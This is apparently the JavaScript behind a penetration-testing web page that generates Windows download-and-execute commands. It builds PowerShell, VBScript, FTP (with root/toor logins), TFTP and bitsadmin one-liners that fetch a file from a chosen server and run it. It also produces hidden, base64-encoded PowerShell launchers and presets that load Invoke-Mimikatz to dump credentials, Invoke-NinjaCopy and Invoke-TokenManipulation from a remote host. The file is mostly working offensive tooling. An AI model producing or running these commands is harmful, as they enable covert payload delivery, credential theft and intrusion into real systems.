// Replace consts
var SOURCE_FILE = "SOURCE_FILE";
var HOSTING_SERVER = "HOSTING_SERVER";
var DEST_FILE = "DEST_FILE";
var CUSTOM_PORT = "CUSTOM_PORT";

var PS_DownNExec = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE','DEST_FILE');Start-Process 'DEST_FILE'";
var PS_DownNExecShell = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE','DEST_FILE');(New-Object -com Shell.Application).ShellExecute('DEST_FILE');";
var PS_Download = "PowerShell (New-Object System.Net.WebClient).DownloadFile('http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE','DEST_FILE');";

var VBS_DownNExec = "cmd.exe /c \"@echo url = \"http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE\"> tmpfile.vbs&@echo dst = \"DEST_FILE\">> tmpfile.vbs&@echo Set o = CreateObject(\"MSXML2.XMLHTTP\")>> tmpfile.vbs&@echo o.open \"GET\", url, false>> tmpfile.vbs&@echo o.send()>> tmpfile.vbs&@echo If o.Status = 200 Then>> tmpfile.vbs&@echo Set a = CreateObject(\"ADODB.Stream\")>> tmpfile.vbs&@echo a.Open>> tmpfile.vbs&@echo a.Type = 1 >> tmpfile.vbs&@echo a.Write o.ResponseBody>> tmpfile.vbs&@echo a.Position = 0>> tmpfile.vbs&@echo a.SaveToFile dst>> tmpfile.vbs&@echo a.Close>> tmpfile.vbs&@echo End if>> tmpfile.vbs&@echo Set s = CreateObject(\"WScript.Shell\")>> tmpfile.vbs&@echo s.Exec(dst)>> tmpfile.vbs&cscript.exe tmpfile.vbs\"";
var VBS_Download = "cmd.exe /c \"@echo url = \"http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE\"> tmpfile.vbs&@echo dst = \"DEST_FILE\">> tmpfile.vbs&@echo Set o = CreateObject(\"MSXML2.XMLHTTP\")>> tmpfile.vbs&@echo o.open \"GET\", url, false>> tmpfile.vbs&@echo o.send()>> tmpfile.vbs&@echo If o.Status = 200 Then>> tmpfile.vbs&@echo Set a = CreateObject(\"ADODB.Stream\")>> tmpfile.vbs&@echo a.Open>> tmpfile.vbs&@echo a.Type = 1 >> tmpfile.vbs&@echo a.Write o.ResponseBody>> tmpfile.vbs&@echo a.Position = 0>> tmpfile.vbs&@echo a.SaveToFile dst>> tmpfile.vbs&@echo a.Close>> tmpfile.vbs&@echo End if>> tmpfile.vbs&cscript.exe tmpfile.vbs\"";

var FTP_DownNExec = "cmd.exe /c \"@echo open HOSTING_SERVER> tmpftp.txt&@echo root>> tmpftp.txt&@echo toor>> tmpftp.txt&@echo bin>> tmpftp.txt&@echo get SOURCE_FILE>> tmpftp.txt&@echo bye>> tmpftp.txt&ftp -i -v -s:tmpftp.txt&@start SOURCE_FILE\"";
var FTP_Download = "cmd.exe /c \"@echo open HOSTING_SERVER> tmpftp.txt&@echo root>> tmpftp.txt&@echo toor>> tmpftp.txt&@echo bin>> tmpftp.txt&@echo get SOURCE_FILE>> tmpftp.txt&@echo bye>> tmpftp.txt&ftp -i -v -s:tmpftp.txt\"";
var FTP_DownNExec_Anon = "cmd.exe /c \"@echo open HOSTING_SERVER> tmpftp.txt&@echo bin>> tmpftp.txt&@echo get SOURCE_FILE>> tmpftp.txt&@echo bye>> tmpftp.txt&ftp -A -i -v -s:tmpftp.txt&@start SOURCE_FILE\"";
var FTP_Download_Anon = "cmd.exe /c \"@echo open HOSTING_SERVER> tmpftp.txt&@echo bin>> tmpftp.txt&@echo get SOURCE_FILE>> tmpftp.txt&@echo bye>> tmpftp.txt&ftp -A -i -v -s:tmpftp.txt\"";

var TFTP_DownNExec = "cmd.exe /c \"tftp -i HOSTING_SERVER get SOURCE_FILE DEST_FILE&start DEST_FILE\""
var TFTP_Download = "tftp -i HOSTING_SERVER get SOURCE_FILE DEST_FILE"

var BITS_DownNExec = "cmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE DEST_FILE&start DEST_FILE\""
var BITS_Download = "cmd.exe /c \"bitsadmin /transfer myjob /download /priority high http://HOSTING_SERVERCUSTOM_PORT/SOURCE_FILE DEST_FILE\""

function Generate()
{
	var srcFile = document.getElementById("srcfile").value;
	var Server = document.getElementById("server").value;
	
	if (srcFile == "" || Server == "")
	{
		document.getElementById("p_input_error").style.display = "block";
	}
	else
	{
		document.getElementById("p_input_error").style.display = "none";
		
		var dstFile = document.getElementById("dstfile").value;

		var Port = document.getElementById("port").value;
		
		var HttpPort = Port;
		if (HttpPort != "")
			HttpPort = ":" + HttpPort;

		if (dstFile == "")
			dstFile = srcFile;

		// PowerShell
		if (document.getElementById("c_powershell").checked == true)
		{
			document.getElementById("p_powershell").style.display = "block";
			
			SetText("r_powershell_dne_shell", PS_DownNExecShell, srcFile, Server, dstFile, HttpPort);
			SetText("r_powershell_dne", PS_DownNExec, srcFile, Server, dstFile, HttpPort);
			SetText("r_powershell_d", PS_Download, srcFile, Server, dstFile, HttpPort);
		}
		else
		{
			document.getElementById("p_powershell").style.display = "none";
		}
		
		// VBS
		if (document.getElementById("c_vbscript").checked == true)
		{
			document.getElementById("p_vbscript").style.display = "block";
			
			SetText("r_vbscript_dne", VBS_DownNExec, srcFile, Server, dstFile, HttpPort);
			SetText("r_vbscript_d", VBS_Download, srcFile, Server, dstFile, HttpPort);
		}
		else
		{
			document.getElementById("p_vbscript").style.display = "none";
		}
		
		// FTP
		if (document.getElementById("c_ftp").checked == true)
		{
			document.getElementById("p_ftp").style.display = "block";
			
			SetText("r_ftp_dne", FTP_DownNExec, srcFile, Server, dstFile, Port);
			SetText("r_ftp_d", FTP_Download, srcFile, Server, dstFile, Port);
			SetText("r_ftp_dne_a", FTP_DownNExec_Anon, srcFile, Server, dstFile, Port);
			SetText("r_ftp_d_a", FTP_Download_Anon, srcFile, Server, dstFile, Port);
		}
		else
		{
			document.getElementById("p_ftp").style.display = "none";
		}
		
		// TFTP
		if (document.getElementById("c_tftp").checked == true)
		{
			document.getElementById("p_tftp").style.display = "block";
			
			SetText("r_tftp_dne", TFTP_DownNExec, srcFile, Server, dstFile, Port);
			SetText("r_tftp_d", TFTP_Download, srcFile, Server, dstFile, Port);
		}
		else
		{
			document.getElementById("p_tftp").style.display = "none";
		}
		
		// btiadmin
		if (document.getElementById("c_bitsa").checked == true)
		{
			document.getElementById("p_bitsa").style.display = "block";

			var DstTmp = dstFile;
			if (!DstTmp.indexOf("\\") > -1)
				DstTmp = "%cd%\\" + DstTmp;
			
			SetText("r_bitsa_dne", BITS_DownNExec, srcFile, Server, DstTmp, HttpPort);
			SetText("r_bitsa_d", BITS_Download, srcFile, Server, DstTmp, HttpPort);
		}
		else
		{
			document.getElementById("p_bitsa").style.display = "none";
		}
	}
}

function SetText(Panel, BaseString, srcFile, Server, dstFile, Port)
{
	document.getElementById(Panel).innerHTML = ReplaceAll(BaseString, srcFile, Server, dstFile, Port);
}

function ReplaceAll(BaseString, srcFile, Server, dstFile, Port)
{
	result = BaseString.replace(/SOURCE_FILE/g, srcFile);
	result = result.replace(/HOSTING_SERVER/g, Server);
	result = result.replace(/DEST_FILE/g, dstFile);
	result = result.replace(/CUSTOM_PORT/g, Port);
	
	return result;
}

function SetPSCommandFromGui()
{
	SetPSCommand(document.getElementById("clear_PS_command").value);
}

function SetPSCommand(cmd)
{
	document.getElementById("clear_PS_command").value = cmd;
	document.getElementById("clear_PS_command_result").innerHTML = "powershell -nop -w hidden -com " + cmd;

	var enc = Base64EncodeUnicode(cmd);
	document.getElementById("encoded_PS_command_result").innerHTML = "powershell -nop -w hidden -enc " + enc;
}

function PSCommandAliases(alias)
{
	if (alias == 'mimi')
	{
		SetPSCommandFromFile("Invoke-Mimikatz -DumpCreds", "Invoke-Mimikatz.ps1");
	}
	else if (alias == "ninja")
	{
		var LocalFile = document.getElementById("srcfile").value;
		var DstFile = document.getElementById("dstfile").value;
		if (LocalFile == "") LocalFile = "C:\\temp\\1.txt";
		if (DstFile == "") DstFile = "C:\\temp\\2.txt";
		var tmpcmd = ReplaceAll("Invoke-NinjaCopy -Path SOURCE_FILE -RemoteDestination DEST_FILE", LocalFile, "127.0.0.1", DstFile, "");
		SetPSCommandFromFile(tmpcmd, "Invoke-NinjaCopy.ps1");
	}
	else if (alias == 'tokens')
	{
		var dstFile = document.getElementById("dstfile").value;
		if (dstFile == "")
		{
			dstFile = "C:\\temp\\tokens.txt";
		}
		
		var tmpCmd = "Invoke-TokenManipulation -Enumerate |Out-File -Encoding \"UTF8\" -FilePath " + dstFile;
		SetPSCommandFromFile(tmpCmd, "Invoke-TokenManipulation.ps1");
	}
}

function SetPSCommandFromFile(cmd, file)
{
	// Get Variables
	var Server = document.getElementById("server").value;
	var Port = document.getElementById("port").value;
	
	if (Server == "")
	{
		Server = "127.0.0.1"
	}
	
	var HttpPort = Port;
	if (HttpPort != "")
		HttpPort = ":" + HttpPort;
	
	// Build Command
	BaseComm = "IEX (New-Object Net.WebClient).DownloadString('http://HOSTING_SERVERCUSTOM_PORT/PS_FILE'); CUSTOM_COMMAND"
	BaseComm = BaseComm.replace(/HOSTING_SERVER/g, Server);
	BaseComm = BaseComm.replace(/CUSTOM_PORT/g, HttpPort);
	BaseComm = BaseComm.replace(/PS_FILE/g, file);
	BaseComm = BaseComm.replace(/CUSTOM_COMMAND/g, cmd);
	
	SetPSCommand(BaseComm);
}

function Encode()
{
	SetPSCommand(document.getElementById("clear_PS_command").value);
}

function Base64EncodeUnicode(cmd)
{
    var ar = new Array(cmd.length * 2);
    var i,j,s;

	for (i = 0, j = 0; i < cmd.length; j = 2 * ++i)
		ar[j] = cmd.charCodeAt(i);
	s = String.fromCharCode.apply(String, ar);
	return btoa(s);
}